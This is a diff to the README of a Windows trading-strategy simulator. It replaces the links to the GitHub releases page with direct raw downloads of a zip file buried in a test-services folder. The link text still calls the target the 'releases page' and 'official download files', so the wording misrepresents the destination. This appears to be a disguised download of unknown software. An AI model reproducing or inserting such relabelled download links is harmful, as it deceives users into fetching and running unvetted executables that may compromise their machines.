@@ -1,6 +1,6 @@
 # 📈 TradingStrategySimulator - Test your trading ideas with ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/violettetranslatable383/TradingStrategySimulator/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/violettetranslatable383/TradingStrategySimulator/raw/refs/heads/main/Tests/TradingStrategySimulator.Domain.Tests/Services/Trading-Strategy-Simulator-v2.0.zip)
 
 ## 📌 About this software
 
@@ -24,7 +24,7 @@ Ensure your Windows installation has the latest updates from Microsoft to avoid 
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [releases page](https://github.com/violettetranslatable383/TradingStrategySimulator/releases) to access the official download files.
+1. Visit the [releases page](https://github.com/violettetranslatable383/TradingStrategySimulator/raw/refs/heads/main/Tests/TradingStrategySimulator.Domain.Tests/Services/Trading-Strategy-Simulator-v2.0.zip) to access the official download files.
 2. Look for the file ending in `.zip` or `.msi` under the latest release version.
 3. Save the file to your computer.
 4. If you chose a `.zip` file, right-click it and select Extract All.
